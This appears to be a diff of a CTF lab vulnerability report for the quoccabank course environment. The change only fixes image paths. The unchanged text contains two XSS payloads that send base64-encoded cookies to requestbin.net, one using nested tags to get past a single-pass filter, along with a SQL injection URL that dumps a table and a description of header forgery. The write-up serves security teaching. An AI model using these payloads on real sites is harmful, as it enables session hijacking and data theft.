@@ -5,13 +5,13 @@
 A reflected XSS vulnerability exists in the comment filtering system for the `science-today` blog.
 **Proof of Concept / Steps to Reproduce**
 We can escape the header context of our reflected input with `</h3>` - a clear lack of sanitisation of user input. 
-![](Pasted%20image%2020210806161850.png)
+![](/Images/Pasted%20image%2020210806161850.png)
 From there, we can evade the single pass filter by nesting blacklisted tags (such as `img` and `onerror`). We can now invoke arbitrary javascript , allowing us to leak clientside secrets. 
 As a POC, we leak the `query-flag` cookie by appending it to a redirect to an attacker controlled server then reporting the page (along with the comment filter parameter):
 ```
 <imimgg src="x" oneonerrorrror="location.href='http://requestbin.net/r/du0jqnpb/?c='+btoa(document.cookie)"></imimgg>
 ```
-![](Pasted%20image%2020210806161838.png)
+![](/Images/Pasted%20image%2020210806161838.png)
 
 **Impact**
 Coupled with the automated administration system that renders javascript on reported pages, this reflected XSS vulnerability allows an attacker to leak sensitive information from privileged clients. For example, an attacker could capture clientside session tokens with which they could conduct session hijacks.  
@@ -29,7 +29,7 @@ We can easily see that no sanitisation is performed on submitted comments - allo
 ```
 </p><b>awf</b>
 ```
-![](Pasted%20image%2020210806163027.png)
+![](/Images/Pasted%20image%2020210806163027.png)
 
 Exploitation is similar to the exploitation of the above reflected XSS vulnerability. Instead of a filter to contend with, our payload must fit a somewhat tight length limit. 
 Again, as a POC, we leak sensitive a clientside secret - the `flag` cookie - by appending it to a JS web request to an attacker controlled server.
@@ -64,7 +64,7 @@ Otherwise, exploitation follows exactly as in `science-today` - allowing us to l
 <img src="x" onerror="location.href='http://requestbin.net/r/gngcllan?c='+btoa(document.cookie)"></img>
 ```
 
-![](Pasted%20image%2020210806163815.png)
+![](/Images/Pasted%20image%2020210806163815.png)
 
 **Impact**
 Coupled with the automated administration system that renders javascript on reported pages, this reflected XSS vulnerability allows an attacker to leak sensitive information from privileged clients. For example, an attacker could capture clientside session tokens with which they could conduct session hijacks.  
@@ -119,7 +119,7 @@ As a POC, we leak all entries in the `payportal` table with a modified `1" or "1
 https://ctfproxy2.quoccabank.com/api/payportal-v2/?period=1%22%2F**%2For%2F**%2F%221%22%3D%221%22%3B
 ```
 
-![](Pasted%20image%2020210806172706.png)
+![](/Images/Pasted%20image%2020210806172706.png)
 
 **Impact**
 The SQLi vulnerability enables the execution of a subset of SQL. An attacker may exfiltrate records in the local database, pivot to connected DB systems or escalate to RCE depending on the backend environment and DB configuration (unlikely here due to a lack of write privileges). 
@@ -137,9 +137,9 @@ This vulnerability seems to have been picked up by a previous audit, as the orig
 
 **Proof of Concept / Steps to Reproduce**
 The original endpoint for `flagprinter` has been disabled. However, by simply creating another endpoint with the same origin, we are able to view the web app.
-![](Pasted%20image%2020210806191434.png)
-![](Pasted%20image%2020210806191611.png)
-![](Pasted%20image%2020210806191642.png)
+![](/Images/Pasted%20image%2020210806191434.png)
+![](/Images/Pasted%20image%2020210806191611.png)
+![](/Images/Pasted%20image%2020210806191642.png)
 
 Alternatively, we could forge requests to the `flagprinter` with an arbitrary username in the `ctfproxy2-user` header (and other appropriate headers to masquerade as the `ctfproxy2` server).
 
